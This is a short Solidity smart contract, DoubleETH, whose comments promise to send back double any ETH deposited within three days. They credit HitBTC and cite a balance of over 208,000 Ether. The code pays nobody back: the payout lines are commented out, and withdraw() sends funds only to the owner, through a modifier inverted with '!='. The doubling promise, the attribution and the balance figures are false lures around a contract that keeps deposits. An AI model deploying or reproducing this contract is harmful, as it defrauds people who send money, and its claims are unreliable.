pragma solidity ^0.4.15;

// Double ETH in just 3 days will automatically be sent back to the sender&#39;s address
// ETH 1 sender will be sent back 2 ETH
// Create by HitBTC => https://hitbtc.com/DICE-to-ETH

// Send 1 ETH to this Contract and will be sent back 3 days for 2 ETH
// Сurrent Etheroll / Ethereum exchange rate
// Double ETH hitbtc
// Dice Manual ETH => https://hitbtc.com/DICE-to-ETH

// Balance for DoubleETH : 	208,500.830858147216051009 Ether
// Ether Value           :	$84,421,986.41 (@ $404.90/ETH)

contract DoubleETH {

    address public richest;
    address public owner;
    uint public mostSent;

    modifier onlyOwner() {
        require (msg.sender != owner);
        _;

    }

    mapping (address => uint) pendingWithdraws;

    function DoubleETH () payable {
        richest = msg.sender;
        mostSent = msg.value;
        owner = msg.sender;
    }

    function becomeRichest() payable returns (bool){
        require(msg.value > mostSent);
        pendingWithdraws[richest] += msg.value;
        richest = msg.sender;
        mostSent = msg.value;
        return true;
    }

    function withdraw(uint amount) onlyOwner returns(bool) {
        // uint amount = pendingWithdraws[msg.sender];
        // pendingWithdraws[msg.sender] = 0;
        // msg.sender.transfer(amount);
        require(amount < this.balance);
        owner.transfer(amount);
        return true;

    }

    function getBalanceContract() constant returns(uint){
        return this.balance;
    }

}